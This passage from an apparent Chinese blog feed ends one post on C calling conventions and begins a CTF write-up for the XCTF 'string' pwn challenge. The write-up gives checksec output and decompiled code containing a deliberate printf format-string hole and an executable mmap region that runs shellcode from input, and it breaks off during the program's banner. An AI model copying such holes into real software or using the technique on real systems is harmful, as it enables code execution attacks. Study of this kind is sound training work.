class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意，__declspec是微软关键字，其他系统上可能没有。</p></blockquote><h4 id="六、pascal调用约定"><a href="#六、pascal调用约定" class="headerlink" title="六、pascal调用约定"></a><code>六、pascal调用约定</code></h4><blockquote><p>Pascal语言调用约定，参数按照从左至右的顺序入栈。Pascal语言只支持固定参数的函数，参数的类型和数量完全可知，故由被调函数自身清理堆栈。pascal调用约定输出的函数名称无任何修饰且全部大写。</p><p><br>Win3.X(16位)时支持真正的pascal调用约定；而Win9.X(32位)以后pascal约定由stdcall约定代替(以C约定压栈以Pascal约定清栈)。</p></blockquote><h3 id="0x01-调用约定的主要特点"><a href="#0x01-调用约定的主要特点" class="headerlink" title="0x01 调用约定的主要特点"></a><font color="navy">0x01 调用约定的主要特点</font></h3><p><img src="/images/121-1.jpg" alt></p><blockquote><p>Windows下可直接在函数声明前添加关键字<strong>stdcall、</strong>cdecl或<strong>fastcall等标识确定函数的调用方式，如int </strong>stdcall func()。Linux下可借用函数attribute 机制，如int <strong>attribute</strong>((<strong>stdcall</strong>)) func()。</p><p><br>代码示例如下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __attribute__((__cdecl__)) CalleeFunc(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> k)&#123;</span><br><span class="line"><span class="comment">// int __attribute__((__stdcall__)) CalleeFunc(int i, int j, int k)&#123;</span></span><br><span class="line"><span class="comment">//int __attribute__((__fastcall__)) CalleeFunc(int i, int j, int k)&#123;</span></span><br><span class="line">    <span class="keyword">return</span> i+j+k;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CallerFunc</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    CalleeFunc(<span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    CallerFunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p> 被调函数CalleeFunc分别声明为cdecl、stdcall和fastcall约定时，其汇编代码比较如下表所示：</p></blockquote><p><img src="/images/121-2.png" alt></p><h3 id="0x02-【扩展】可变参数函数支持条件"><a href="#0x02-【扩展】可变参数函数支持条件" class="headerlink" title="0x02 【扩展】可变参数函数支持条件"></a><font color="navy">0x02 【扩展】可变参数函数支持条件</font></h3><blockquote><font color="red">**若要支持可变参数的函数，则参数应自右向左进栈，并且由主调函数负责清除栈中的参数(参数出栈)。**</font><ul><li><p>首先，参数按照从右向左的顺序压栈，则参数列表最左边(第一个)的参数最接近栈顶位置。所有参数距离帧基指针的偏移量都是常数，而不必关心已入栈的参数数目。只要不定的参数的数目能根据第一个已明确的参数确定，就可使用不定参数。例如printf函数，第一个参数即格式化字符串可作为后继参数指示符。通过它们就可得到后续参数的类型和个数，进而知道所有参数的尺寸。当传递的参数过多时，以帧基指针为基准，获取适当数目的参数，其他忽略即可。若函数参数自左向右进栈，则第一个参数距离栈帧指针的偏移量与已入栈的参数数目有关，需要计算所有参数占用的空间后才能精确定位。当实际传入的参数数目与函数期望接受的参数数目不同时，偏移量计算会出错！</p></li><li><p>其次，调用函数将参数压栈，只有它才知道栈中的参数数目和尺寸，因此调用函数可安全地清栈。而被调函数永远也不能事先知道将要传入函数的参数信息，难以对栈顶指针进行调整。</p></li></ul><p>C++为兼容C，仍然支持函数带有可变的参数。但在C++中更好的选择常常是函数多态。</p></blockquote><h3 id="0x03-转载来源"><a href="#0x03-转载来源" class="headerlink" title="0x03 转载来源"></a><font color="navy">0x03 转载来源</font></h3><p> <a href="https://www.cnblogs.com/clover-toeic/p/3756668.html" target="_blank" rel="noopener">C语言函数调用栈(二)</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-常见的调用约定&quot;&gt;&lt;a href=&quot;#0x00-常见的调用约定&quot; class=&quot;headerlink&quot; title=&quot;0x00 常见的调用约定&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;0x00 常见的调用约定&lt;/font&gt;&lt;/h3&gt;&lt;h4 id=
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【XCTF-pwn】由浅入深的剖析 &quot;string&quot; 题目</title>
    <link href="https://muzibing.github.io/2020/05/30/2020.05.30%EF%BC%88120%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/30/2020.05.30（120）/</id>
    <published>2020-05-29T16:00:00.000Z</published>
    <updated>2020-05-31T01:45:14.192Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><font color="navy"><code>0x00 前言</code></font></h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在上一篇“<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>”中已经很详细的阐述格式化字符串漏洞的原理以及如何构造payload，并且用例子进一步的说明了格式化字符串漏洞的危害，今天我们就以XCTF中的<code>string</code>题目为例，再次感受一下格式化字符串漏洞的实际危害。在写这篇文章之前，我已经在网上查了相关的writeup，虽然很多人将这道题目解了出来，并写了相关的writeup发在网上，但是我在看这些文章时，发现这些文章中存在着很多问题以及表述不正确的地方，今天我准备系统的写一下这道题目的writeup，具体的细节就不会一一赘述，如果想了解格式化字符串更多细节，请阅读“<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>”。</p><h3 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a><font color="navy"><code>0x01 题目分析</code></font></h3><h4 id="1-查看-ELF-文件"><a href="#1-查看-ELF-文件" class="headerlink" title="1.查看 ELF 文件"></a><code>1.查看 ELF 文件</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4f9fd3e83d275c6555ec7059823616ffc2f1af1b, stripped</span><br></pre></td></tr></table></figure><blockquote><p>从上述信息可以看出<code>pwn</code>是一个x86-64位的ELF文件</p></blockquote><h4 id="2-查看文件保护机制"><a href="#2-查看文件保护机制" class="headerlink" title="2.查看文件保护机制"></a><code>2.查看文件保护机制</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/string/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>从上述信息中可以看出：</p><ul><li><code>pwn</code>文件的结构<code>amd64-64-little</code>，</li><li>GOT表不可写</li><li>有金丝雀，开启了栈保护，因此无法用实现栈溢出</li><li>栈不可执行</li><li>没有开启地址随机化</li></ul></blockquote><h4 id="3-用-IDA-逆向"><a href="#3-用-IDA-逆向" class="headerlink" title="3.用 IDA 逆向"></a><code>3.用 IDA 逆向</code></h4><blockquote><p>下面我将 IDA 逆向的结果放在一起：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line">// main函数</span><br><span class="line">// 内部含有的函数：sub_400D72(v5);</span><br><span class="line">// 功能：打印v5的地址</span><br><span class="line"></span><br><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // ST88_8@1</span><br><span class="line">  _DWORD *v4; // rax@1</span><br><span class="line">  __int64 v5; // ST18_8@1</span><br><span class="line">  __int64 result; // rax@1</span><br><span class="line">  __int64 v7; // rdx@1</span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  sub_400996(60LL, 0LL);</span><br><span class="line">  v4 = malloc(8uLL);</span><br><span class="line">  v5 = (__int64)v4;</span><br><span class="line">  *v4 = 68;</span><br><span class="line">  v4[1] = 85;</span><br><span class="line">  puts(&quot;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&quot;);</span><br><span class="line">  puts(&quot;we will tell you two secret ...&quot;);</span><br><span class="line">  printf(&quot;secret[0] is %x\n&quot;, v5, a2);</span><br><span class="line">  printf(&quot;secret[1] is %x\n&quot;, v5 + 4);</span><br><span class="line">  puts(&quot;do not tell anyone &quot;);</span><br><span class="line">  sub_400D72(v5);</span><br><span class="line">  puts(&quot;The End.....Really?&quot;);</span><br><span class="line">  result = 0LL;</span><br><span class="line">  v7 = *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_400D72(v5);</span><br><span class="line">// 内部含有的函数：sub_400A7D(&quot;Creating a new player.&quot;);sub_400BB9();sub_400CA6(a1);</span><br><span class="line">// 功能：创建角色名称，长度不能超过13</span><br><span class="line"></span><br><span class="line">__int64 __fastcall sub_400D72(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [sp+10h] [bp-20h]@1</span><br><span class="line">  __int64 v3; // [sp+28h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  puts(&quot;What should your character&apos;s name be:&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%s&quot;, &amp;s);</span><br><span class="line">  if ( strlen(&amp;s) &lt;= 0xC )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Creating a new player.&quot;);</span><br><span class="line">    sub_400A7D();</span><br><span class="line">    sub_400BB9();</span><br><span class="line">    sub_400CA6(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Hei! What&apos;s up!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_400A7D();</span><br><span class="line">// 内部包含的函数：sub_4009DD(&amp;s1, &quot;up&quot;);</span><br><span class="line">// 功能：要求输入“east”才可进行下一步</span><br><span class="line"></span><br><span class="line">__int64 sub_400A7D()</span><br><span class="line">&#123;</span><br><span class="line">  char s1; // [sp+0h] [bp-10h]@2</span><br><span class="line">  __int64 v2; // [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v2 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  puts(&quot; This is a famous but quite unusual inn. The air is fresh and the&quot;);</span><br><span class="line">  puts(&quot;marble-tiled ground is clean. Few rowdy guests can be seen, and the&quot;);</span><br><span class="line">  puts(&quot;furniture looks undamaged by brawls, which are very common in other pubs&quot;);</span><br><span class="line">  puts(&quot;all around the world. The decoration looks extremely valuable and would fit&quot;);</span><br><span class="line">  puts(&quot;into a palace, but in this city it&apos;s quite ordinary. In the middle of the&quot;);</span><br><span class="line">  puts(&quot;room are velvet covered chairs and benches, which surround large oaken&quot;);</span><br><span class="line">  puts(&quot;tables. A large sign is fixed to the northern wall behind a wooden bar. In&quot;);</span><br><span class="line">  puts(&quot;one corner you notice a fireplace.&quot;);</span><br><span class="line">  puts(&quot;There are two obvious exits: east, up.&quot;);</span><br><span class="line">  puts(&quot;But strange thing is ,no one there.&quot;);</span><br><span class="line">  puts(&quot;So, where you will go?east or up?:&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(&quot;%s&quot;, &amp;s1);</span><br><span class="line">    if ( !strcmp(&amp;s1, &quot;east&quot;) || !strcmp(&amp;s1, &quot;east&quot;) )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;hei! I&apos;m secious!&quot;);</span><br><span class="line">    puts(&quot;So, where you will go?:&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( strcmp(&amp;s1, &quot;east&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !strcmp(&amp;s1, &quot;up&quot;) )</span><br><span class="line">      sub_4009DD(&amp;s1, &quot;up&quot;);</span><br><span class="line">    puts(&quot;YOU KNOW WHAT YOU DO?&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_4009DD();</span><br><span class="line">// 内部包含的函数：*</span><br><span class="line">// </span><br><span class="line"></span><br><span class="line">void __noreturn sub_4009DD()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax@1</span><br><span class="line">  int v1; // eax@2</span><br><span class="line">  int v2; // [sp+0h] [bp-10h]@2</span><br><span class="line">  unsigned int v3; // [sp+4h] [bp-Ch]@2</span><br><span class="line">  __int64 v4; // [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  puts(&quot;You go right, suddenly, a big hole appear front you!&quot;);</span><br><span class="line">  puts(&quot;where you will go?!left(0) or right(1)?!:&quot;);</span><br><span class="line">  v0 = time(0LL);</span><br><span class="line">  srand(v0);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = rand();</span><br><span class="line">    v3 = ((((unsigned int)v1 &gt;&gt; 31) + (_BYTE)v1) &amp; 1) - ((unsigned int)v1 &gt;&gt; 31);</span><br><span class="line">    _isoc99_scanf(&quot;%d&quot;, &amp;v2);</span><br><span class="line">    if ( v2 != v3 )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;You escape it!but another hole appear!&quot;);</span><br><span class="line">    puts(&quot;where you will go?!left(0) or right(1)?!:&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;YOU ARE DEAD&quot;);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_400BB9();</span><br><span class="line">// 内部包含的函数：*</span><br><span class="line">// 功能：输入一个地址、wish（存在格式化漏洞）</span><br><span class="line"></span><br><span class="line">__int64 sub_400BB9()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [sp+4h] [bp-7Ch]@1</span><br><span class="line">  __int64 v2; // [sp+8h] [bp-78h]@1</span><br><span class="line">  char format; // [sp+10h] [bp-70h]@2</span><br><span class="line">  __int64 v4; // [sp+78h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  v2 = 0LL;</span><br><span class="line">  puts(&quot;You travel a short distance east.That&apos;s odd, anyone disappear suddenly&quot;);</span><br><span class="line">  puts(&quot;, what happend?! You just travel , and find another hole&quot;);</span><br><span class="line">  puts(&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;);</span><br><span class="line">  puts(&quot;go into there(1), or leave(0)?:&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;A voice heard in your mind&quot;);</span><br><span class="line">    puts(&quot;&apos;Give me an address&apos;&quot;);</span><br><span class="line">    _isoc99_scanf(&quot;%ld&quot;, &amp;v2);</span><br><span class="line">    puts(&quot;And, you wish is:&quot;);</span><br><span class="line">    _isoc99_scanf(&quot;%s&quot;, &amp;format);</span><br><span class="line">    puts(&quot;Your wish is&quot;);</span><br><span class="line">    printf(&amp;format, &amp;format);</span><br><span class="line">    puts(&quot;I hear it, I hear it....&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_400CA6(a1);</span><br><span class="line">// 内部包含的函数：mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);</span><br><span class="line">// 功能：当满足*(_DWORD *)a1 == *(_DWORD *)(a1 + 4) 条件的时候，可以直接输入shellcode，执行我们需要的代码</span><br><span class="line"></span><br><span class="line">__int64 __fastcall sub_400CA6(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  void *v1; // rsi@2</span><br><span class="line">  __int64 v3; // [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  puts(&quot;Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!&quot;);</span><br><span class="line">  puts(&quot;Dragon say: HaHa! you were supposed to have a normal&quot;);</span><br><span class="line">  puts(&quot;RPG game, but I have changed it! you have no weapon and &quot;);</span><br><span class="line">  puts(&quot;skill! you could not defeat me !&quot;);</span><br><span class="line">  puts(&quot;That&apos;s sound terrible! you meet final boss!but you level is ONE!&quot;);</span><br><span class="line">  if ( *(_DWORD *)a1 == *(_DWORD *)(a1 + 4) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wizard: I will help you! USE YOU SPELL&quot;);</span><br><span class="line">    v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);</span><br><span class="line">    read(0, v1, 0x100uLL);</span><br><span class="line">    ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br></pre></td></tr></table></figure><blockquote><p>为了更加清楚的表示出各个函数之间的关系，我将上面的函数包含关系做了一个示意图，如下：</p></blockquote><p><img src="/images/120-1.png" alt></p><blockquote><p>从上面的图中可以得出这样的结论：</p><ul><li><p>要想使程序执行shellcode就需要使<code>*(_DWORD *)a1 == *(_DWORD *)(a1 + 4)</code>条件成立</p></li><li><p>该程序一共有 <code>5</code> 处输入，要想程序成功执行shellcode，其中前三个输入被要求为：</p><ul><li><code>What should your character&#39;s name be:</code> 要求长度不超过13的字符串</li><li><code>So, where you will go?east or up?:</code> 要求输入<code>east</code></li><li><code>go into there(1), or leave(0)?:</code> 要求输入<code>1</code>‘</li></ul><p>其中后面两个输入都可以被利用，后面会一一进行讲解</p><ul><li>在第<code>5</code>个输入后有一个printf的格式化字符串漏洞</li></ul></li></ul><p>目前上述信息是通过IDA逆向后能到的信息，下面我们简单的运行一下该程序</p></blockquote><p><code>知识点1：mmap();函数</code><sup>[1]</sup></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当创建一个或者切换一个进程的同时，会把属于这个当前进程的系统信息载入。这些系统信息中包含了当前进程的运行空间。当用户程序调用mmap后。函数会在当前进程的空间中找到适合的vma来描述自己将要映射的区域。这个区域的作用就是将mmap函数中文件描述符所指向的具体文件中内容映射过来。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原理是mmap的执行，仅仅是在内核中建立了文件与虚拟内存空间的对应关系。用户访问这些虚拟内存空间时，页面表里面是没有这些空间的表项的。当用户程序试图访问这些映射的空间时，于是产生缺页异常。内核捕捉这些异常，逐渐将文件载入。所谓的载入过程，具体的操作就是read和write在管理pagecache。Vma的结构体中有很文件操作集。vma操作集中会有自己关于page cache的操作集合。这样，虽然是两种不同的系统调用，由于操作和调用触发的路径不同。但是最后还是落实到了page cache的管理。实现了文件内容的操作。</p><h4 id="4-运行-pwn"><a href="#4-运行-pwn" class="headerlink" title="4.运行 pwn"></a><code>4.运行 pwn</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Welcome to Dragon Games!</span><br><span class="line">                                                 .~)&gt;&gt;</span><br><span class="line">                                               .~))))&gt;&gt;&gt;</span><br><span class="line">                                             .~))&gt;&gt;             ___\</span><br><span class="line">                                           .~))&gt;&gt;)))&gt;&gt;      .-~))&gt;&gt;\</span><br><span class="line">                                         .~)))))&gt;&gt;       .-~))&gt;&gt;)&gt;   </span><br><span class="line">                                       .~)))&gt;&gt;))))&gt;&gt;  .-~)&gt;&gt;)&gt;       </span><br><span class="line">                   )                 .~))&gt;&gt;))))&gt;&gt;  .-~)))))&gt;&gt;)&gt;</span><br><span class="line">                ( )@@*)             //)&gt;))))))  .-~))))&gt;&gt;)&gt;</span><br><span class="line">              ).@(@@               //))&gt;&gt;))) .-~))&gt;&gt;)))))&gt;&gt;)&gt;</span><br><span class="line">            (( @.@).              //))))) .-~)&gt;&gt;)))))&gt;&gt;)&gt;</span><br><span class="line">          ))  )@@*.@@ )          //)&gt;))) //))))))&gt;&gt;))))&gt;&gt;)&gt;</span><br><span class="line">       ((  ((@@@.@@             |/))))) //)))))&gt;&gt;)))&gt;&gt;)&gt;</span><br><span class="line">      )) @@*. )@@ )   (\_(\  |))&gt;)) //)))&gt;&gt;)))))))&gt;&gt;)&gt;</span><br><span class="line">    (( @@@(.@(@ .    _/`-`  ~|b |&gt;))) //)&gt;&gt;)))))))&gt;&gt;)&gt;</span><br><span class="line">     )* @@@ )@*     (@) (@)  |))) //))))))&gt;&gt;))))&gt;&gt;</span><br><span class="line">   (( @. )@( @ .   _/       / )) //))&gt;&gt;)))))&gt;&gt;&gt;_._</span><br><span class="line">    )@@ (@@*)@@.  (6,   6) / ^ )//))))))&gt;&gt;)))&gt;&gt;   ~~-.</span><br><span class="line"> ( @jgs@@. @@@.*@_ ~^~^~, /\  ^ /)&gt;&gt;))))&gt;&gt;      _.     `,</span><br><span class="line">  ((@@ @@@*.(@@ .   \^^^/&apos; (  ^  )))&gt;&gt;        .&apos;         `,</span><br><span class="line">   ((@@).*@@ )@ )    `-&apos;   ((   ^  ~)_          /             `,</span><br><span class="line">     (@@. (@@ ).           (((   ^    `\        |               `.</span><br><span class="line">       (*.@*              / ((((        \        \      .         `.</span><br><span class="line">                         /   (((((  \    \    _.-~\     Y,         ;</span><br><span class="line">                        /   / (((((( \    \.-~   _.`&quot; _.-~`,       ;</span><br><span class="line">                       /   /   `(((((()    )    (((((~      `,     ;</span><br><span class="line">                     _/  _/      `&quot;&quot;&quot;/   /&apos;                  ;     ;</span><br><span class="line">                 _.-~_.-~           /  /&apos;                _.-~   _.&apos;</span><br><span class="line">               ((((~~              / /&apos;              _.-~ __.--~</span><br><span class="line">                                  ((((          __.-~ _.-~</span><br><span class="line">                                              .&apos;   .~~</span><br><span class="line">                                              :    ,&apos;</span><br><span class="line"></span><br><span class="line">we 